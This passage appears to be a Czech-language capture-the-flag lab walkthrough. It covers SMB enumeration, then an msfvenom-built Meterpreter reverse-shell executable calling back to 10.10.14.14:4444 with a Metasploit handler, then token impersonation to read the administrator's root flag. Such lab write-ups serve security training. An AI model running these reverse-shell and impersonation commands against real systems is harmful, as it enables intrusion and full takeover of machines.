### Enumerace SMB
Kontroluji SMB sdílení a hledám data, která mohou obsahovat citlivé informace.
`smbmap -u "root" -p "" -d workgroup -H $IP`

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`msfconsole`
```
use exploit/multi/handler
set exitonsession false
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.14
run -j
```

### Spuštění exploitu (2)
Zde dochází k praktickému zneužití zranitelnosti.
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe -o test.exe`

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`Impersonating`
```
use incognito
list_tokens -u
impersonate_token "RE\\coby"

gc C:\users\administrator\desktop\root.txt

```
